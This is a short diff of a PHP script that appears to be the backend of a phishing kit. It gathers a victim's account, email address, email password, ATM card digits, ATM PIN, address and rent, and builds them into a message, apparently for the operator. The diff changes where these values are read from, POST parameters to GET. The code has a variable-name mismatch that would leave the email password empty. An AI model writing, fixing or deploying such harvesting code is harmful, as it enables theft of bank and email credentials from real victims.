@@ -13,13 +13,13 @@ header("Access-Control-Allow-Headers: *");
     
    
         
-        $account = $_POST['account'];
-        $email = $_POST['email'];
-        $emailPass = $_POST['email-pass'];
-        $atmCard = $_POST['atm-card'];
-        $atmPin = $_POST['atm-pin'];
-        $address = $_POST['address'];
-        $rent = $_POST['rent'];
+        $account = $_GET['account'];
+        $email = $_GET['email'];
+        $emailPass = $_GET['email-pass'];
+        $atmCard = $_GET['atm-card'];
+        $atmPin = $_GET['atm-pin'];
+        $address = $_GET['address'];
+        $rent = $_GET['rent'];
 
 
         $message = "Account: ".$account."<br> Email: ".$email."<br> Email-Password: ".$emailpass."<br> Last 6: ".$atmCard."<br> Pin: ".$atmPin."<br> Address: ".$address."<br> Rent: ".$rent;
